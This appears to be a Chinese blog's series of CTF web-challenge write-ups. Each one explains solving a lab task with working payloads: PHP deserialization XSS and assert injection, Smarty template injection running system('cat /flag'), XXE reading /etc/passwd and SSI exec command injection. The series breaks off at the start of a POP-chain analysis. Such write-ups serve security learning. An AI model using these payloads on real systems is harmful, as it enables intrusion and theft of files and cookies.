<h2 id="Schrodinger"><a href="#Schrodinger" class="headerlink" title="Schrödinger"></a>Schrödinger</h2><p>题目有一段很长的话，翻译一下大概就是，这个网站可以爆破出各种网站的密码之类的，留下了一个文本框，可能是要我们爆破什么网栈的密码，有一个input输入，以及一个check，如果再未完成之前check可能会失败。</p>
<p>题目就是这个意思，现在应该要做的就是网站需要我们爆破的是什么密码：</p>
<p>在复制文本翻译的时候，意外发现了隐藏的一句话，被标白色了：</p>
<p><img src="/2022/03/16/BJDCTF%E5%A4%8D%E7%8E%B0/9.png" alt="1"></p>
<p>打开看一下</p>
<p><img src="/2022/03/16/BJDCTF%E5%A4%8D%E7%8E%B0/10.png" alt="1"></p>
<p>也就是我们需要爆破这个网站了，输入网站开始等待。</p>
<p>等待了很久发现很慢很慢好像没有什么用，之前点了check发现又得重来，所以抓个包看看</p>
<p><img src="/2022/03/16/BJDCTF%E5%A4%8D%E7%8E%B0/11.png" alt="1"></p>
<p>发现比input之前多了一段代码，%3D是<code>==</code>很明显是base64编码，拿去解密一下看到是一个时间的编码，那我们这里出现的时间说明，这个解密应该是虚假的，但是时间应该是多少呢，既然他根据时间来，我们把时间删了他是不是可以直接出来flag？删除</p>
<p><img src="/2022/03/16/BJDCTF%E5%A4%8D%E7%8E%B0/12.png" alt="1"></p>
<p>可以看到有一个av号，打开看下哦吼：量子力学，一个正经课程，flag应该不会藏在视频里面，去评论区看看找到了flag(不得不说真阴间啊)</p>
<h2 id="XSS之光"><a href="#XSS之光" class="headerlink" title="XSS之光"></a>XSS之光</h2><p>进入题目就被劝退让我gun，哈哈哈。看了一下前端，啥也没有，扫一下目录发现有git目录，应该是源码泄露了，用githack下载源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;yds_is_so_beautiful&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> unserialize(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>

<p>有一个get传参，然后输出一个反序列化的结果，既然是xss之光，应该就是执行xss语句，那么我们怎么让他反序列化之后是一个xss语句，因为题目中没有给出类，所以我们只能利用php的原生类，可以用error原生类或者exception原生类，error适用版本是7版本，exception适用版本是5或者7，所以这里用exception</p>
<p>创建一个序列化脚本</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>

<p>就可以执行弹窗命令了，一般要顺带信息出来的话，flag一般都是藏在cookie里面的</p>
<p>所以我们中间的数字替换成<code>document.cookie</code>尝试一下，发现正确执行弹窗，但是返回的好像是当前页面的cookie，看了大佬们的wp发现需要进行一个<code>windows.local.href</code>进行访问一个网站再弹出flag的时候就会自动更改flag（因为更改的flag是由服务器set更改来的，所以需要访问一个网站）</p>
<h2 id="elementmaster（元素大师）"><a href="#elementmaster（元素大师）" class="headerlink" title="elementmaster（元素大师）"></a>elementmaster（元素大师）</h2><p>题目页面是一张图片，啥也没有，找找有什么特别的地方，发现再源码里面有两个id非常奇怪，是隐藏属性</p>
<p><img src="/2022/03/16/BJDCTF%E5%A4%8D%E7%8E%B0/13.png" alt="1"></p>
<p>发现经过16进制编码之后前面一个是Po.后面是php</p>
<p>访问一下这个网页，乍一看以为是空白网站，自己一看有一个点，经过漫长的猜测寻找，发现还是不懂，稍稍的找了一下wp，一看第一行，说的Po是化学元素，再结合页面里面只有一个点，猜测应该是爆破，访问化学元素周期表里面的网站，然后将里面的数据进行拼接拿到flag</p>
<p>附上payload脚本：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &#x27;http://a20a2a2e-59ba-40e3-9297-fdecb894b7f3.node4.buuoj.cn:81/&#x27;</span><br><span class="line">asd = &#x27;&#x27;</span><br><span class="line">elemts = [&#x27;H&#x27;, &#x27;He&#x27;, &#x27;Li&#x27;, &#x27;Be&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;N&#x27;, &#x27;O&#x27;, &#x27;F&#x27;, &#x27;Ne&#x27;, &#x27;Na&#x27;, &#x27;Mg&#x27;, &#x27;Al&#x27;, &#x27;Si&#x27;, &#x27;P&#x27;, &#x27;S&#x27;, &#x27;Cl&#x27;, &#x27;Ar&#x27;,</span><br><span class="line">         &#x27;K&#x27;, &#x27;Ca&#x27;, &#x27;Sc&#x27;, &#x27;Ti&#x27;, &#x27;V&#x27;, &#x27;Cr&#x27;, &#x27;Mn&#x27;, &#x27;Fe&#x27;, &#x27;Co&#x27;, &#x27;Ni&#x27;, &#x27;Cu&#x27;, &#x27;Zn&#x27;, &#x27;Ga&#x27;, &#x27;Ge&#x27;, &#x27;As&#x27;, &#x27;Se&#x27;, &#x27;Br&#x27;,</span><br><span class="line">         &#x27;Kr&#x27;, &#x27;Rb&#x27;, &#x27;Sr&#x27;, &#x27;Y&#x27;, &#x27;Zr&#x27;, &#x27;Nb&#x27;, &#x27;Mo&#x27;, &#x27;Te&#x27;, &#x27;Ru&#x27;, &#x27;Rh&#x27;, &#x27;Pd&#x27;, &#x27;Ag&#x27;, &#x27;Cd&#x27;, &#x27;In&#x27;, &#x27;Sn&#x27;, &#x27;Sb&#x27;, &#x27;Te&#x27;,</span><br><span class="line">         &#x27;I&#x27;, &#x27;Xe&#x27;, &#x27;Cs&#x27;, &#x27;Ba&#x27;, &#x27;La&#x27;, &#x27;Ce&#x27;, &#x27;Pr&#x27;, &#x27;Nd&#x27;, &#x27;Pm&#x27;, &#x27;Sm&#x27;, &#x27;Eu&#x27;, &#x27;Gd&#x27;, &#x27;Tb&#x27;, &#x27;Dy&#x27;, &#x27;Ho&#x27;, &#x27;Er&#x27;, &#x27;Tm&#x27;,</span><br><span class="line">         &#x27;Yb&#x27;, &#x27;Lu&#x27;, &#x27;Hf&#x27;, &#x27;Ta&#x27;, &#x27;W&#x27;, &#x27;Re&#x27;, &#x27;Os&#x27;, &#x27;Ir&#x27;, &#x27;Pt&#x27;, &#x27;Au&#x27;, &#x27;Hg&#x27;, &#x27;Tl&#x27;, &#x27;Pb&#x27;, &#x27;Bi&#x27;, &#x27;Po&#x27;, &#x27;At&#x27;, &#x27;Rn&#x27;,</span><br><span class="line">         &#x27;Fr&#x27;, &#x27;Ra&#x27;, &#x27;Ac&#x27;, &#x27;Th&#x27;, &#x27;Pa&#x27;, &#x27;U&#x27;, &#x27;Np&#x27;, &#x27;Pu&#x27;, &#x27;Am&#x27;, &#x27;Cm&#x27;, &#x27;Bk&#x27;, &#x27;Cf&#x27;, &#x27;Es&#x27;, &#x27;Fm&#x27;,&#x27;Md&#x27;, &#x27;No&#x27;, &#x27;Lr&#x27;,</span><br><span class="line">         &#x27;Rf&#x27;, &#x27;Db&#x27;, &#x27;Sg&#x27;, &#x27;Bh&#x27;, &#x27;Hs&#x27;, &#x27;Mt&#x27;, &#x27;Ds&#x27;, &#x27;Rg&#x27;, &#x27;Cn&#x27;, &#x27;Nh&#x27;, &#x27;Fl&#x27;, &#x27;Mc&#x27;, &#x27;Lv&#x27;, &#x27;Ts&#x27;, &#x27;Og&#x27;, &#x27;Uue&#x27;]</span><br><span class="line">for i in elemts:</span><br><span class="line">    io = requests.get(url + i + &quot;.php&quot;)</span><br><span class="line">    if(io.status_code==200):</span><br><span class="line">        asd += io.text</span><br><span class="line">        print(asd)</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/16/BJDCTF%E5%A4%8D%E7%8E%B0/14.png" alt="1"></p>
<p>拿到flag，说实话脑洞题目（完全没往这方面想QAQ）</p>
<h2 id="文件探测"><a href="#文件探测" class="headerlink" title="文件探测"></a>文件探测</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">system.php</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if (!isset($_COOKIE[&#x27;y1ng&#x27;]) || $_COOKIE[&#x27;y1ng&#x27;] !== sha1(md5(&#x27;y1ng&#x27;)))&#123;</span><br><span class="line">    echo &quot;&lt;script&gt;alert(&#x27;why you are here!&#x27;);alert(&#x27;fxck your scanner&#x27;);alert(&#x27;fxck you! get out!&#x27;);&lt;/script&gt;&quot;;</span><br><span class="line">    header(&quot;Refresh:0.1;url=index.php&quot;);</span><br><span class="line">    die;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">$</span><span class="bash">str2 = <span class="string">&#x27;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;url invalid&lt;br&gt;~$ &#x27;</span>;</span></span><br><span class="line"><span class="meta">$</span><span class="bash">str3 = <span class="string">&#x27;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;damn hacker!&lt;br&gt;~$ &#x27;</span>;</span></span><br><span class="line"><span class="meta">$</span><span class="bash">str4 = <span class="string">&#x27;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;request method error&lt;br&gt;~$ &#x27;</span>;</span></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">home.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">setcookie(&quot;y1ng&quot;, sha1(md5(&#x27;y1ng&#x27;)), time() + 3600);</span><br><span class="line">setcookie(&#x27;your_ip_address&#x27;, md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]), time()+3600);</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">if(isset($</span><span class="bash">_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span></span><br><span class="line">    if (preg_match(&quot;/\^|\~|&amp;|\|/&quot;, $_GET[&#x27;file&#x27;])) &#123;</span><br><span class="line">        die(&quot;forbidden&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(preg_match(&quot;/.?f.?l.?a.?g.?/i&quot;, $_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">        die(&quot;not now!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(preg_match(&quot;/.?a.?d.?m.?i.?n.?/i&quot;, $_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">        die(&quot;You! are! not! my! admin!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(preg_match(&quot;/^home$/i&quot;, $_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">        die(&quot;禁止套娃&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    else&#123;</span><br><span class="line">        if(preg_match(&quot;/home$/i&quot;, $_GET[&#x27;file&#x27;]) or preg_match(&quot;/system$/i&quot;, $_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">            $file = $_GET[&#x27;file&#x27;].&quot;.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $file = $_GET[&#x27;file&#x27;].&quot;.fxxkyou!&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        echo &quot;现在访问的是 &quot;.$file . &quot;&lt;br&gt;&quot;;</span><br><span class="line">        require $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;&lt;script&gt;location.href=&#x27;./home.php?file=system&#x27;&lt;/script&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <tags>
        <tag>BJDCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>ReadlezPHP</title>
    <url>/2022/03/20/ReadlezPHP/</url>
    <content><![CDATA[<h1 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h1><p>题目页面啥也没看出来，打开源码看看</p>
<p><img src="/2022/03/20/ReadlezPHP/1.png" alt="1"></p>
<p>找到一个页面，打开看看</p>
<p><img src="/2022/03/20/ReadlezPHP/2.png" alt="1"></p>
<p>看出意图，反序列化题目，分析一下代码，这个类的作用主要就是先将时间代码写入类的a，b中然后再下面的析构方法组合，我们需要重写构造方法，构造出assert(phpinfo())也就是说我们的b要构造成assert，然后a构造phpinfo()然后序列化一下传入data就行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class HelloPhp</span><br><span class="line">&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;a = &quot;phpinfo()&quot;;</span><br><span class="line">        $this-&gt;b = &quot;assert&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">$</span><span class="bash">c = new HelloPhp;</span></span><br><span class="line">echo serialize($c);</span><br></pre></td></tr></table></figure>

<p>payload：</p>
<p><code>data=O:8:&quot;HelloPhp&quot;:2:&#123;s:1:&quot;a&quot;;s:9:&quot;phpinfo()&quot;;s:1:&quot;b&quot;;s:6:&quot;assert&quot;;&#125;</code></p>
<p>flag在phpinfo里面</p>
]]></content>
      <tags>
        <tag>NPUCTF2020</tag>
      </tags>
  </entry>
  <entry>
    <title>华东南赛区-Web11</title>
    <url>/2022/03/20/%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Web11/</url>
    <content><![CDATA[<h1 id="CISCN华东南赛区-web11"><a href="#CISCN华东南赛区-web11" class="headerlink" title="[CISCN华东南赛区]-web11"></a>[CISCN华东南赛区]-web11</h1><p>进入题目先观察一下</p>
<p><img src="/2022/03/20/%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Web11/1.png" alt="1"></p>
<p>右上角出现一个本地ip，然后页面下方给出了模板的类型，猜测应该就是smarty模板漏洞，注入点的华应该就在ip这里，页面上还有XFF提示，测试一下</p>
<p>{$smarty.version}可以看到页面的回显</p>
<p><img src="/2022/03/20/%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Web11/2.png" alt="1"></p>
<p>版本号测试成功。我们可以直接执行命令<code>&#123;system(&#39;cat /flag&#39;)&#125;</code>拿到flag</p>
<p>应该可以用{php}{/php}包含可以执行中间的php语句，但是本题好像不行，包括了会报错，旧版本应该可行</p>
<p>在官方描述里是这么说的：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Smarty已经废弃&#123;php&#125;标签，强烈建议不要使用。在Smarty 3.1，&#123;php&#125;仅在SmartyBC中可用。</span><br></pre></td></tr></table></figure>



<p>如果题目是php5的话可以这样写：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;script language=&quot;php&quot;&gt;phpinfo();&lt;/script&gt;</span><br><span class="line">php7版本已经不支持这么写了</span><br></pre></td></tr></table></figure>

<p>网上查了还有用静态方法的方式调用：</p>
<p>Smarty类的<code>getStreamVariable</code>方法的代码：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">public function getStreamVariable($variable)</span><br><span class="line">&#123;</span><br><span class="line">        $_result = &#x27;&#x27;;</span><br><span class="line">        $fp = fopen($variable, &#x27;r+&#x27;);</span><br><span class="line">        if ($fp) &#123;</span><br><span class="line">            while (!feof($fp) &amp;&amp; ($current_line = fgets($fp)) !== false) &#123;</span><br><span class="line">                $_result .= $current_line;</span><br><span class="line">            &#125;</span><br><span class="line">            fclose($fp);</span><br><span class="line">            return $_result;</span><br><span class="line">        &#125;</span><br><span class="line">        $smarty = isset($this-&gt;smarty) ? $this-&gt;smarty : $this;</span><br><span class="line">        if ($smarty-&gt;error_unassigned) &#123;</span><br><span class="line">            throw new SmartyException(&#x27;Undefined stream variable &quot;&#x27; . $variable . &#x27;&quot;&#x27;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>可以读取一个方法并且返回他的内容，我们用self调用这个而静态方法就行，网上的payload<code>&#123;self::getStreamVariable(“file:///etc/passwd”)&#125;</code>但是这里好像不能用，会报错，因为旧版本的ssti利用方式在新版的这里已经被删除了</p>
<p>还可以用if标签</p>
<p>{if+php语句}{/if}</p>
<p>这样也是可以执行php语句的</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&#123;if phpinfo()&#125;&#123;/if&#125;</span><br><span class="line">&#123;if system(&#x27;cat /flag&#x27;)&#125;&#123;/if&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>CISCN</tag>
      </tags>
  </entry>
  <entry>
    <title>PYWebsite</title>
    <url>/2022/03/21/PYWebsite/</url>
    <content><![CDATA[<h1 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h1><p>进入页面就让我购买flag，还66块钱，心黑啊。</p>
<p>查看网页源码，发现前端包含了授权码验证的代码</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">function enc(code)&#123;</span><br><span class="line">  hash = hex_md5(code);</span><br><span class="line">  return hash;</span><br><span class="line">&#125;</span><br><span class="line">function validate()&#123;</span><br><span class="line">  var code = document.getElementById(&quot;vcode&quot;).value;</span><br><span class="line">  if (code != &quot;&quot;)&#123;</span><br><span class="line">    if(hex_md5(code) == &quot;0cd4da0223c0b280829dc3ea458d655c&quot;)&#123;</span><br><span class="line">      alert(&quot;您通过了验证！&quot;);</span><br><span class="line">      window.location = &quot;./flag.php&quot;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">      alert(&quot;你的授权码不正确！&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">    alert(&quot;请输入授权码&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<p>需要我们能输入的值的md5等于这个<code>0cd4da0223c0b280829dc3ea458d655c</code></p>
<p>这个到md5解码网站解了一下，解不出来，那么我们就把他换掉</p>
<p>复制他进入控制台，粘贴修改md5的值，修改成123456的md5<code>e10adc3949ba59abbe56e057f20f883e</code></p>
<p>然后我们直接输入123456就可以进去flag.php页面（其实好像直接进入这个页面也没差，不管，这个方式帅一点）</p>
<p>进去之后</p>
<p>又有隐藏提示：</p>
<p><img src="/2022/03/21/PYWebsite/1.png" alt="1"></p>
<p>就差直接说把我们的ip构造成127.0.0.1了，直接添加XFF头，拿到flag</p>
]]></content>
      <tags>
        <tag>MRCTF2020</tag>
      </tags>
  </entry>
  <entry>
    <title>FakeXML-cookboos</title>
    <url>/2022/03/21/FakeXML-cookbook/</url>
    <content><![CDATA[<h1 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h1><p>本题主要考到xxe（xml外部实体注入）</p>
<p><img src="/2022/03/21/FakeXML-cookbook/1.png" alt="1"></p>
<p>进入题目给出了一个登录框，看起来很像是sql注入，但是题目提示是XML所以也就不看了，登录一下抓个包看看</p>
<p><img src="/2022/03/21/FakeXML-cookbook/2.png" alt="1"></p>
<p>可以看到这与一般的post登录框不同，这里传入参数是一种xml方式，所以漏洞点应该就在这里，我们可以定义一个实体，导入本地计算机里面根目录下面的flag文件，然后执行这个实体就行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;#声明一个xml文件</span><br><span class="line">&lt;!DOCTYPE test [  #声明此文件是test类型的文档</span><br><span class="line">  &lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;  </span><br><span class="line"><span class="meta">  #</span><span class="bash">对file实体的声明&lt;!ENTITY 实体名称 <span class="string">&quot;实体内容&quot;</span>&gt;SYSTEM或者PUBLIC引入外部资源，表示实体来自本地还是公共计算机，&lt;!ENTITY 实体名称 SYSTEM <span class="string">&quot;URI/URL&quot;</span>&gt;或者&lt;!ENTITY 实体名称 PUBLIC <span class="string">&quot;public_ID&quot;</span> <span class="string">&quot;URI&quot;</span>&gt;</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>

<p>最后在文件里使用&file;调用这个实体，所以我们构造一个paiload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test[</span><br><span class="line">        &lt;!ENTITY file SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">    ]&gt;</span><br></pre></td></tr></table></figure>

<p>然后我们在username中调用这个实体，他就会返回根目录下flag的内容：</p>
<p><img src="/2022/03/21/FakeXML-cookbook/3.png" alt="1"></p>
<p>​    </p>
]]></content>
      <tags>
        <tag>NCTF2019</tag>
      </tags>
  </entry>
  <entry>
    <title>EasySearch</title>
    <url>/2022/03/23/EasySearch/</url>
    <content><![CDATA[<h1 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h1><p>终究最重要的还是信息收集</p>
<p><img src="/2022/03/23/EasySearch/1.png" alt="1"></p>
<p>以为是sql注入什么的，用sqlmap跑了好久，没用，最后发现有一个swp源代码泄露打开index.php.swp查看源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	ob_start();</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">get_hash</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable">$chars</span> = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>;</span><br><span class="line">		<span class="variable">$random</span> = <span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)];<span class="comment">//Random 5 times</span></span><br><span class="line">		<span class="variable">$content</span> = uniqid().<span class="variable">$random</span>;</span><br><span class="line">		<span class="keyword">return</span> sha1(<span class="variable">$content</span>); </span><br><span class="line">	&#125;</span><br><span class="line">    header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">	***</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) <span class="keyword">and</span> <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$admin</span> = <span class="string">&#x27;6d0bc1&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> ( <span class="variable">$admin</span> == substr(md5(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]),<span class="number">0</span>,<span class="number">6</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$file_shtml</span> = <span class="string">&quot;public/&quot;</span>.get_hash().<span class="string">&quot;.shtml&quot;</span>;</span><br><span class="line">            <span class="variable">$shtml</span> = fopen(<span class="variable">$file_shtml</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable to open file!&quot;</span>);</span><br><span class="line">            <span class="variable">$text</span> = <span class="string">&#x27;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Hello,&#x27;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&#x27;&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">			***&#x27;</span>;</span><br><span class="line">            fwrite(<span class="variable">$shtml</span>,<span class="variable">$text</span>);</span><br><span class="line">            fclose(<span class="variable">$shtml</span>);</span><br><span class="line">            ***</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;[!] Header  error ...&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            </span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">	***</span><br><span class="line">    &#125;</span><br><span class="line">	***</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>最主要的就是这个判断了，主要判断的就是密码，用户名检测输入之后进入第一层判断，admin的值已经设定，我们需要密码的md5值的前六位等于<code>6d0bc1</code></p>
<p>最简单的方法就是写个循环爆破一下（太简单，我就不写了）我挑的是2020666进入第二个if，抓个包看一下，当我们输入了正确的匹配密码之后回显：</p>
<p><img src="/2022/03/23/EasySearch/2.png" alt="1"></p>
<p>访问上面的地址</p>
<p><img src="/2022/03/23/EasySearch/3.png" alt="1"></p>
<p>可以看到页面回显了我们的ip以及我们的用户名，而且这个页面是shtml，可以动态执行我们的命令，查询了一下写一个exec</p>
<p><code>&lt;!--#exec cmd=&quot;ls &quot;--&gt;</code>然后访问，发现执行了我们的命令，在根目录还有当前目录都没有发现flag，那我们就尝试一层一层网上查看，在当前目录的上级找到了flag文件</p>
<p>最终paiload：<code>username=&lt;!--#exec cmd=&quot;cat ../flag_990c66bf85a09c664f0b6741840499b2&quot;--&gt;&amp;password=2020666</code></p>
]]></content>
      <tags>
        <tag>BJDCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>MRCTF2020-Ezpop</title>
    <url>/2022/03/23/MRCTF2020-Ezpop/</url>
    <content><![CDATA[<h1 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h1><p>开始就给出了源码，需要我们构造反序列化链子：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//flag is in flag.php</span><br><span class="line">//WTF IS THIS?</span><br><span class="line">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span><br><span class="line">//And Crack It!</span><br><span class="line">class Modifier &#123;</span><br><span class="line">    protected  $var;</span><br><span class="line">    public function append($value)&#123;</span><br><span class="line">        include($value);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $this-&gt;append($this-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file=&#x27;index.php&#x27;)&#123;</span><br><span class="line">        $this-&gt;source = $file;</span><br><span class="line">        echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return $this-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;</span><br><span class="line">            echo &quot;hacker&quot;;</span><br><span class="line">            $this-&gt;source = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;p = array();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($key)&#123;</span><br><span class="line">        $function = $this-&gt;p;</span><br><span class="line">        return $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">if(isset($</span><span class="bash">_GET[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span></span><br><span class="line">    @unserialize($_GET[&#x27;pop&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    $a=new Show;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先分开一个个分析把：</p>
